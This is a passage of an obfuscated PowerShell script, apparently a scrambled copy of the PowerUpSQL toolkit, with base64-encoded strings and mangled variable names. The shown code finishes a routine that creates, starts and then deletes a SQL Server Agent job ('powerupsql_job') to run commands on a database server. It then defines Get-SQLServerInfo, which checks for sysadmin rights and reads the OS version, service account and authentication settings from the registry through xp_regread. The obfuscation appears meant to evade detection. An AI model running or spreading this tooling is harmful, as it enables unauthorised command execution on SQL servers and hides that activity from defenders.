AAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARQBYAEUAQwBVAFQARQAgAGQAYgBvAC4AcwBwAF8AYQBkAGQAXwBqAG8AYgBzAGUAcgB2AGUAcgAgAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEAAagBvAGIAXwBuAGEAbQBlACAAIAAgACAAIAAgACAAIAAgACAAIAA9ACAATgAnAHAAbwB3AGUAcgB1AHAAcwBxAGwAXwBqAG8AYgAnAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEUAWABFAEMAVQBUAEUAIABkAGIAbwAuAHMAcABfAHMAdABhAHIAdABfAGoAbwBiACAATgAnAHAAbwB3AGUAcgB1AHAAcwBxAGwAXwBqAG8AYgAnAA==')))
                ${__/\_/\_/=\/=\_/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBTAEUAIABtAHMAZABiADsAIABFAFgARQBDAFUAVABFACAAcwBwAF8AZABlAGwAZQB0AGUAXwBqAG8AYgAgAEAAagBvAGIAXwBuAGEAbQBlACAAPQAgAE4AJwBwAG8AdwBlAHIAdQBwAHMAcQBsAF8AagBvAGIAJwA7AA==')))
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUgB1AG4AbgBpAG4AZwAgAHQAaABlACAAYwBvAG0AbQBhAG4AZAA=')))
                Get-SQLQuery -Instance $Instance -Query ${___/=\_/====\/=\_} -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                ${_/\_/==\___/=\/\_} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAIABtAHMAZABiADsAIABFAFgARQBDAFUAVABFACAAcwBwAF8AaABlAGwAcABfAGoAbwBiACAAQABqAG8AYgBfAG4AYQBtAGUAIAA9ACAATgAnAHAAbwB3AGUAcgB1AHAAcwBxAGwAXwBqAG8AYgAnAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                if(!(${_/\_/==\___/=\/\_})) {
                    Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SgBvAGIAIABmAGEAaQBsAGUAZAAgAHQAbwAgAHMAdABhAHIAdAAuACAAUgBlAGMAaABlAGMAawAgAHkAbwB1AHIAIABjAG8AbQBtAGEAbgBkACAAYQBuAGQAIAB0AHIAeQAgAGEAZwBhAGkAbgAuAA==')))
                    $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBnAGUAbgB0ACAASgBvAGIAIABmAGEAaQBsAGUAZAAgAHQAbwAgAHMAdABhAHIAdAAuAA=='))))
                    return
                }
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwB0AGEAcgB0AGkAbgBnACAAcwBsAGUAZQBwACAAZgBvAHIAIAAkAFMAbABlAGUAcAAgAHMAZQBjAG8AbgBkAHMA')))
                sleep $Sleep
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUgBlAG0AbwB2AGkAbgBnACAAagBvAGIAIABmAHIAbwBtACAAcwBlAHIAdgBlAHIA')))
                Get-SQLQuery -Instance $Instance -Query ${__/\_/\_/=\/=\_/\} -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABKAG8AYgAgAHMAdQBjAGMAZQBzAGYAdQBsAGwAeQAgAHMAdABhAHIAdABlAGQAIABhAG4AZAAgAHcAYQBzACAAcgBlAG0AbwB2AGUAZAAuAA=='))))
            }
            else
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAWQBvAHUAIABkAG8AIABuAG8AdAAgAGgAYQB2AGUAIABwAHIAaQB2AGkAbABlAGcAZQBzACAAdABvACAAYQBkAGQAIABhAGcAZQBuAHQAIABqAG8AYgBzACAAKABzAHAAXwBhAGQAZABfAGoAbwBiACkALgAgAEEAYgBvAHIAdABpAG4AZwAuAC4ALgA=')))
                $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdQBmAGYAaQBjAGkAZQBuAHQAIABwAHIAaQB2AGkAbABpAGUAZwBlAHMAIAB0AG8AIABhAGQAZAAgAEEAZwBlAG4AdAAgAEoAbwBiAHMALgA='))))
                return
            }
            ${__/=\____/\__/==\}.Close()
            ${__/=\____/\__/==\}.Dispose()
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG0AbQBhAG4AZAAgAGMAbwBtAHAAbABlAHQAZQA=')))
        }
        catch
        {
            if(-not $SuppressVerbose)
            {
                ${/=\_______/===\__} = $_.Exception.Message
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            $null = ${/=\_____/\/\/=\__}.Rows.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIABBAGMAYwBlAHMAcwBpAGIAbABlAA=='))))
        }
        return ${/=\_____/\/\/=\__}
    }
}
Function  Get-SQLServerInfo
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${_/=\/=\/=\_/\/\/=} = New-Object -TypeName System.Data.DataTable
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        ${/=====\/\/\_/===\} = Get-SQLSession -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose |
        ? -FilterScript {
            $_.SessionStatus -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgB1AG4AbgBpAG4AZwA=')))
        } |
        measure -Line |
        select -Property Lines -ExpandProperty Lines
        ${__/\/==\____/\_/=} = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
        if(${__/\/==\____/\_/=} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
        {
            ${___/==\_/\/=\/=\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAALQAtACAARwBlAHQAIABtAGEAYwBoAGkAbgBlACAAdAB5AHAAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABEAEUAQwBMAEEAUgBFACAAQABNAGEAYwBoAGkAbgBlAFQAeQBwAGUAIAAgAFMAWQBTAE4AQQBNAEUADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARQBYAEUAQwBVAFQARQAgAG0AYQBzAHQAZQByAC4AZABiAG8ALgB4AHAAXwByAGUAZwByAGUAYQBkAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEAAcgBvAG8AdABrAGUAeQAJAAkAPQAgAE4AJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQAnACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQABrAGUAeQAJAAkACQA9ACAATgAnAFMAWQBTAFQARQBNAFwAQwB1AHIAcgBlAG4AdABDAG8AbgB0AHIAbwBsAFMAZQB0AFwAQwBvAG4AdAByAG8AbABcAFAAcgBvAGQAdQBjAHQATwBwAHQAaQBvAG4AcwAnACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQAB2AGEAbAB1AGUAXwBuAGEAbQBlAAkACQA9ACAATgAnAFAAcgBvAGQAdQBjAHQAVAB5AHAAZQAnACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQAB2AGEAbAB1AGUACQAJAAkAPQAgAEAATQBhAGMAaABpAG4AZQBUAHkAcABlACAAbwB1AHQAcAB1AHQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAALQAtACAARwBlAHQAIABPAFMAIAB2AGUAcgBzAGkAbwBuAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEQARQBDAEwAQQBSAEUAIABAAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAgACAAUwBZAFMATgBBAE0ARQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABFAFgARQBDAFUAVABFACAAbQBhAHMAdABlAHIALgBkAGIAbwAuAHgAcABfAHIAZQBnAHIAZQBhAGQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQAByAG8AbwB0AGsAZQB5AAkACQA9ACAATgAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFACcALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABAAGsAZQB5AAkACQAJAD0AIABOACcAUwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuACcALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABAAHYAYQBsAHUAZQBfAG4AYQBtAGUACQAJAD0AIABOACcAUAByAG8AZAB1AGMAdABOAGEAbQBlACcALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQAB2AGEAbAB1AGUACQAJAAkAPQAgAEAAUAByAG8AZAB1AGMAdABOAGEAbQBlACAAbwB1AHQAcAB1AHQA')))
            ${__/\___/\/=\/==\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAEAATQBhAGMAaABpAG4AZQBUAHkAcABlACAAYQBzACAAWwBPAHMATQBhAGMAaABpAG4AZQBUAHkAcABlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQABQAHIAbwBkAHUAYwB0AE4AYQBtAGUAIABhAHMAIABbAE8AUwBWAGUAcgBzAGkAbwBuAE4AYQBtAGUAXQAsAA==')))
        }
        else
        {
            ${___/==\_/\/=\/=\_} = ''
            ${__/\___/\/=\/==\_} = ''
        }
        $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAC0ALQAgAEcAZQB0ACAAUwBRAEwAIABTAGUAcgB2AGUAcgAgAEkAbgBmAG8AcgBtAGEAdABpAG8AbgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAALQAtACAARwBlAHQAIABTAFEATAAgAFMAZQByAHYAZQByACAAUwBlAHIAdgBpAGMAZQAgAE4AYQBtAGUAIABhAG4AZAAgAFAAYQB0AGgADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEQARQBDAEwAQQBSAEUAIABAAFMAUQBMAFMAZQByAHYAZQByAEkAbgBzAHQAYQBuAGMAZQAgAHYAYQByAGMAaABhAHIAKAAyADUAMAApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABEAEUAQwBMAEEAUgBFACAAQABTAFEATABTAGUAcgB2AGUAcgBTAGUAcgB2AGkAYwBlAE4AYQBtAGUAIAB2AGEAcgBjAGgAYQByACgAMgA1ADAAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBmACAAQABAAFMARQBSAFYASQBDAEUATgBBAE0ARQAgAD0AIAAnAE0AUwBTAFEATABTAEUAUgBWAEUAUgAnAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABCAEUARwBJAE4ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMAZQB0ACAAQABTAFEATABTAGUAcgB2AGUAcgBJAG4AcwB0AGEAbgBjAGUAIAA9ACAAJwBTAFkAUwBUAEUATQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAFMAZQByAHYAaQBjAGUAcwBcAE0AUwBTAFEATABTAEUAUgBWAEUAUgAnAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAGUAdAAgAEAAUwBRAEwAUwBlAHIAdgBlAHIAUwBlAHIAdgBpAGMAZQBOAGEAbQBlACAAPQAgACcATQBTAFMAUQBMAFMARQBSAFYARQBSACcADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEUATgBEAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABFAEwAUwBFAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABCAEUARwBJAE4ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMAZQB0ACAAQABTAFEATABTAGUAcgB2AGUAcgBJAG4AcwB0AGEAbgBjAGUAIAA9ACAAJwBTAFkAUwBUAEUATQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAFMAZQByAHYAaQBjAGUAcwBcAE0AUwBTAFEATAAkACcAKwBjAGEAcwB0ACgAQABAAFMARQBSAFYASQBDAEUATgBBAE0ARQAgAGEAcwAgAHYAYQByAGMAaABhAHIAKAAyADUAMAApACkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMAZQB0ACAAQABTAFEATABTAGUAcgB2AGUAcgBTAGUAcgB2AGkAYwBlAE4AYQBtAGUAIAA9ACAAJwBNAFMAUwBRAEwAJAAnACsAYwBhAHMAdAAoAEAAQABTAEUAUgBWAEkAQwBFAE4AQQBNAEUAIABhAHMAIAB2AGEAcgBjAGgAYQByACgAMgA1ADAAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABFAE4ARAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAALQAtACAARwBlAHQAIABTAFEATAAgAFMAZQByAHYAZQByACAAUwBlAHIAdgBpAGMAZQAgAEEAYwBjAG8AdQBuAHQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEQARQBDAEwAQQBSAEUAIABAAFMAZQByAHYAaQBjAGUAQQBjAGMAbwB1AG4AdABOAGEAbQBlACAAdgBhAHIAYwBoAGEAcgAoADIANQAwACkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEUAWABFAEMAVQBUAEUAIABtAGEAcwB0AGUAcgAuAGQAYgBvAC4AeABwAF8AaQBuAHMAdABhAG4AYwBlAF8AcgBlAGcAcgBlAGEAZAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAATgAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFACcALAAgAEAAUwBRAEwAUwBlAHIAdgBlAHIASQBuAHMAdABhAG4AYwBlACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE4AJwBPAGIAagBlAGMAdABOAGEAbQBlACcALABAAFMAZQByAHYAaQBjAGUAQQBjAGMAbwB1AG4AdABOAGEAbQBlACAATwBVAFQAUABVAFQALAAgAE4AJwBuAG8AXwBvAHUAdABwAHUAdAAnAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAtAC0AIABHAGUAdAAgAGEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgAgAG0AbwBkAGUADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEQARQBDAEwAQQBSAEUAIABAAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgBNAG8AZABlACAASQBOAFQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEUAWABFAEMAIABtAGEAcwB0AGUAcgAuAGQAYgBvAC4AeABwAF8AaQBuAHMAdABhAG4AYwBlAF8AcgBlAGcAcgBlAGEAZAAgAE4AJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQAnACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE4AJwBTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAE0AUwBTAFEATABTAGUAcgB2AGUAcgBcAE0AUwBTAFEATABTAGUAcgB2AGUAcgAnACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE4AJwBMAG8AZwBpAG4ATQBvAGQAZQAnACwAIABAAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgBNAG8AZABlACAATwBVAFQAUABVAFQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC0ALQAgAEcAZQB0ACAAdABoAGUAIABmAG8AcgBjAGUAZAAgAGUAbgBjAHIAeQBwAHQAaQBvAG4AIABmAGwAYQBnAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABCAEUARwBJAE4AIABUAFIAWQAgAA0ACgAJACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEQARQBDAEwAQQBSAEUAIABAAEYAbwByAGMAZQBkAEUAbgBjAHIAeQBwAHQAaQBvAG4AIABJAE4AVAANAAoACQAgACAAIAAgACAAIAAgACAAIAAgACAAIABFAFgARQBDACAAbQBhAHMAdABlAHIALgBkAGIAbwAuAHgAcABfAGkAbgBzAHQAYQBuAGMAZQBfAHIAZQBnAHIAZQBhAGQAIABOACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAJwAsAA0ACgAJACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE4AJwBTAE8ARgBUAFcAQQBSAEUAXABNAEkAQwBSAE8AUwBPAEYAVABcAE0AaQBjAHIAbwBzAG8AZgB0ACAAUwBRAEwAIABTAGUAcgB2AGUAcgBcAE0AUwBTAFEATABTAGUAcgB2AGUAcgBcAFMAdQBwAGUAcgBTAG8AYwBrAGUAdABOAGUAdABMAGkAYgAnACwADQAKAAkAIAAgACAAIAAgACAAIAAgACAAIAAgACAATgAnAEYAbwByAGMAZQBFAG4AYwByAHkAcAB0AGkAbwBuACcALAAgAEAARgBvAHIAYwBlAGQARQBuAGMAcgB5AHAAdABpAG8AbgAgAE8AVQBUAFAAVQBUAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABFAE4ARAAgAFQAUgBZAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABCAEUARwBJAE4AIABDAEEAVABDAEgACQAgACAAIAAgACAAIAAgACAAIAAgACAAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAARQBOAEQAIABDAEEAVABDAEgADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC0ALQAgAEcAcgBhAGIAIABhAGQAZABpAHQAaQBvAG4AYQBsACAAaQBuAGYAbwByAG0AYQB0AGkAbwBuACAAYQBzACAAcwB5AHMAYQBkAG0AaQBuAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHsAXwBfAF8ALwA9AD0AXABfAC8AXAAvAD0AXAAvAD0AXABfAH0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC0ALQAgAFIAZQB0AHUAcgBuACAAcwBlAHIAdgBlAHIAIABhAG4AZAAgAHYAZQByAHMAaQBvAG4AIABpAG4AZgBvAHIAbQBhAHQAaQBvAG4ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFMARQBMAEUAQwBUACAAIAAnACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAJwAgAGEAcwAgAFsAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABAAEAAcwBlAHIAdgBlAHIAbgBhAG0AZQAgAGEAcwAgAFsASQBuAHMAdABhAG4AYwBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAARABFAEYAQQBVAEwAVABfAEQATwBNAEEASQBOACgAKQAgAGEAcwAgAFsARABvAG0AYQBpAG4ATgBhAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFMARQBSAFYARQBSAFAAUgBPAFAARQBSAFQAWQAoACcAcAByAG8AYwBlAHMAcwBpAGQAJwApACAAYQBzACAAUwBlAHIAdgBpAGMAZQBQAHIAbwBjAGUAcwBzAEkARAAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABAAFMAUQBMAFMAZQByAHYAZQByAFMAZQByAHYAaQBjAGUATgBhAG0AZQAgAGEAcwAgAFsAUwBlAHIAdgBpAGMAZQBOAGEAbQBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQABTAGUAcgB2AGkAYwBlAEEAYwBjAG8AdQBuAHQATgBhAG0AZQAgAGEAcwAgAFsAUwBlAHIAdgBpAGMAZQBBAGMAYwBvAHUAbgB0AF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAKABTAEUATABFAEMAVAAgAEMAQQBTAEUAIABAAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgBNAG8AZABlAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABXAEgARQBOACAAMQAgAFQASABFAE4AIAAnAFcAaQBuAGQAbwB3AHMAIABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AJwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVwBIAEUATgAgADIAIABUAEgARQBOACAAJwBXAGkAbgBkAG8AdwBzACAAYQBuAGQAIABTAFEATAAgAFMAZQByAHYAZQByACAAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuACcADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEUATABTAEUAIAAnAFUAbgBrAG4AbwB3AG4AJwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAARQBOAEQAKQAgAGEAcwAgAFsAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAE0AbwBkAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABAAEYAbwByAGMAZQBkAEUAbgBjAHIAeQBwAHQAaQBvAG4AIABhAHMAIABGAG8AcgBjAGUAZABFAG4AYwByAHkAcAB0AGkAbwBuACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEMAQQBTAEUAIAAgAFMARQBSAFYARQBSAFAAUgBPAFAARQBSAFQAWQAoACcASQBzAEMAbAB1AHMAdABlAHIAZQBkACcAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVwBIAEUATgAgADAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFQASABFAE4AIAAnAE4AbwAnAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABFAEwAUwBFACAAJwBZAGUAcwAnAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABFAE4ARAAgAGEAcwAgAFsAQwBsAHUAcwB0AGUAcgBlAGQAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABTAEUAUgBWAEUAUgBQAFIATwBQAEUAUgBUAFkAKAAnAHAAcgBvAGQAdQBjAHQAdgBlAHIAcwBpAG8AbgAnACkAIABhAHMAIABbAFMAUQBMAFMAZQByAHYAZQByAFYAZQByAHMAaQBvAG4ATgB1AG0AYgBlAHIAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABTAFUAQgBTAFQAUgBJAE4ARwAoAEAAQABWAEUAUgBTAEkATwBOACwAIABDAEgAQQBSAEkATgBEAEUAWAAoACcAMgAnACwAIABAAEAAVgBFAFIAUwBJAE8ATgApACwAIAA0ACkAIABhAHMAIABbAFMAUQBMAFMAZQByAHYAZQByAE0AYQBqAG8AcgBWAGUAcgBzAGkAbwBuAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcwBlAHIAdgBlAHIAcAByAG8AcABlAHIAdAB5ACgAJwBFAGQAaQB0AGkAbwBuACcAKQAgAGEAcwAgAFsAUwBRAEwAUwBlAHIAdgBlAHIARQBkAGkAdABpAG8AbgBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFMARQBSAFYARQBSAFAAUgBPAFAARQBSAFQAWQAoACcAUAByAG8AZAB1AGMAdABMAGUAdgBlAGwAJwApACAAQQBTACAAWwBTAFEATABTAGUAcgB2AGUAcgBTAGUAcgB2AGkAYwBlAFAAYQBjAGsAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABTAFUAQgBTAFQAUgBJAE4ARwAoAEAAQABWAEUAUgBTAEkATwBOACwAIABDAEgAQQBSAEkATgBEAEUAWAAoACcAeAAnACwAIABAAEAAVgBFAFIAUwBJAE8ATgApACwAIAAzACkAIABhAHMAIABbAE8AUwBBAHIAYwBoAGkAdABlAGMAdAB1AHIAZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAewBfAF8ALwBcAF8AXwBfAC8AXAAvAD0AXAAvAD0APQBcAF8AfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUgBJAEcASABUACgAUwBVAEIAUwBUAFIASQBOAEcAKABAAEAAVgBFAFIAUwBJAE8ATgAsACAAQwBIAEEAUgBJAE4ARABFAFgAKAAnAFcAaQBuAGQAbwB3AHMAIABOAFQAJwAsACAAQABAAFYARQBSAFMASQBPAE4AKQAsACAAMQA0ACkALAAgADMAKQAgAGEAcwAgAFsATwBzAFYAZQByAHMAaQBvAG4ATgB1AG0AYgBlAHIAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABTAFkAUwBUAEUATQBfAFUAUwBFAFIAIABhAHMAIABbAEMAdQByAHIAZQBuAHQAbABvAGcAaQBuAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJwAkAHsAXwBfAC8AXAAvAD0APQBcAF8AXwBfAF8ALwBcAF8ALwA9AH0AJwAgAGEAcwAgAFsASQBzAFMAeQBzAGEAZABtAGkAbgBd